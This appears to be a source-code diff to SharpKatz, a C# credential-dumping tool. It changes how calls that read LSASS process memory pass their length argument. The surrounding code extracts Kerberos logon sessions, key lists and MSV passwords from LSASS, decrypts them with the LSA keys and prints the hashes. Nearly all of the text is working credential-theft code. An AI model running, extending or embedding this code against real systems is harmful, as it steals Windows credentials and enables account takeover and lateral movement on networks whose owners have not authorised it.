@@ -350,12 +350,12 @@ namespace SharpKatz.Module
             if (pElement == IntPtr.Zero)
                 return;
 
-            byte[] entryBytes = Utility.ReadFromLsass(ref hLsass, pElement, Convert.ToUInt64(Marshal.SizeOf(typeof(RTL_AVL_TABLE))));
+            byte[] entryBytes = Utility.ReadFromLsass(ref hLsass, pElement, Marshal.SizeOf(typeof(RTL_AVL_TABLE)));
             RTL_AVL_TABLE entry = Utility.ReadStruct<RTL_AVL_TABLE>(entryBytes);
 
             if (entry.OrderedPointer != IntPtr.Zero)
             {
-                byte[] krbrLogonSessionBytes = Utility.ReadFromLsass(ref hLsass, entry.OrderedPointer, Convert.ToUInt64(oshelper.LogonSessionTypeSize));
+                byte[] krbrLogonSessionBytes = Utility.ReadFromLsass(ref hLsass, entry.OrderedPointer, oshelper.LogonSessionTypeSize);
 
                 klogonlist.Add(krbrLogonSessionBytes);
             }
@@ -383,7 +383,7 @@ namespace SharpKatz.Module
             string username = Utility.ExtractUnicodeStringString(hLsass, usUserName);
             string domain = Utility.ExtractUnicodeStringString(hLsass, usDomain);
 
-            byte[] msvPasswordBytes = Utility.ReadFromLsass(ref hLsass, usPassword.Buffer, (ulong)usPassword.MaximumLength);
+            byte[] msvPasswordBytes = Utility.ReadFromLsass(ref hLsass, usPassword.Buffer, usPassword.MaximumLength);
 
             byte[] msvDecryptedPasswordBytes = BCrypt.DecryptCredentials(msvPasswordBytes, iv, aeskey, deskey);
 
@@ -451,14 +451,14 @@ namespace SharpKatz.Module
 
             LUID luid = Utility.ReadStruct<LUID>(Utility.GetBytes(krbrLogonSession, oshelper.KerberosSessionLocallyUniqueIdentifierOffset, Marshal.SizeOf(typeof(LUID))));
 
-            byte[] keylistBytes = Utility.ReadFromLsass(ref hLsass, pKeyList, Convert.ToUInt64(Marshal.SizeOf(typeof(KIWI_KERBEROS_KEYS_LIST_6))));
+            byte[] keylistBytes = Utility.ReadFromLsass(ref hLsass, pKeyList, Marshal.SizeOf(typeof(KIWI_KERBEROS_KEYS_LIST_6)));
 
             int items = BitConverter.ToInt32(keylistBytes,Utility.FieldOffset<KIWI_KERBEROS_KEYS_LIST_6>("cbItem"));
             int structsize = Marshal.SizeOf(kerberoshshtype);
 
             int readsize = items * structsize;
 
-            byte[] hashpassBytes = Utility.ReadFromLsass(ref hLsass, IntPtr.Add(pKeyList, Marshal.SizeOf(typeof(KIWI_KERBEROS_KEYS_LIST_6))), (ulong)readsize);
+            byte[] hashpassBytes = Utility.ReadFromLsass(ref hLsass, IntPtr.Add(pKeyList, Marshal.SizeOf(typeof(KIWI_KERBEROS_KEYS_LIST_6))), readsize);
 
             for (int i = 0; i < items; i++)
             {
@@ -486,14 +486,14 @@ namespace SharpKatz.Module
                     {
                         if ((int)entry.Size <= (Utility.FieldOffset<LSAISO_DATA_BLOB>("data") + ("KerberosKey".Length - 1) + AES_256_KEY_LENGTH)) // usual ISO DATA BLOB for Kerberos AES 256 session key
                         {
-                            byte[] isoblobBytes = Utility.ReadFromLsass(ref hLsass, checksum.Buffer, Convert.ToUInt64(Marshal.SizeOf(typeof(LSAISO_DATA_BLOB))));
+                            byte[] isoblobBytes = Utility.ReadFromLsass(ref hLsass, checksum.Buffer, Marshal.SizeOf(typeof(LSAISO_DATA_BLOB)));
                             LSAISO_DATA_BLOB isoblob = Utility.ReadStruct<LSAISO_DATA_BLOB>(isoblobBytes);
 
                             kkey.Key = GenericLsaIsoOutput(isoblob);
                         }
                         else
                         {
-                            byte[] encisoblobBytes = Utility.ReadFromLsass(ref hLsass, checksum.Buffer, Convert.ToUInt64(Marshal.SizeOf(typeof(LSAISO_DATA_BLOB))));
+                            byte[] encisoblobBytes = Utility.ReadFromLsass(ref hLsass, checksum.Buffer, Marshal.SizeOf(typeof(LSAISO_DATA_BLOB)));
                             ENC_LSAISO_DATA_BLOB encisoblob = Utility.ReadStruct<ENC_LSAISO_DATA_BLOB>(encisoblobBytes);
 
                             kkey.Key = GenericEncLsaIsoOutput(encisoblob, (int)entry.Size);
@@ -501,7 +501,7 @@ namespace SharpKatz.Module
                     }
                     else
                     {
-                        byte[] msvPasswordBytes = Utility.ReadFromLsass(ref hLsass, checksum.Buffer, (ulong)checksum.MaximumLength);
+                        byte[] msvPasswordBytes = Utility.ReadFromLsass(ref hLsass, checksum.Buffer, checksum.MaximumLength);
 
                         byte[] msvDecryptedPasswordBytes = BCrypt.DecryptCredentials(msvPasswordBytes, iv, aeskey, deskey);
                         kkey.Key = Utility.PrintHashBytes(msvDecryptedPasswordBytes);
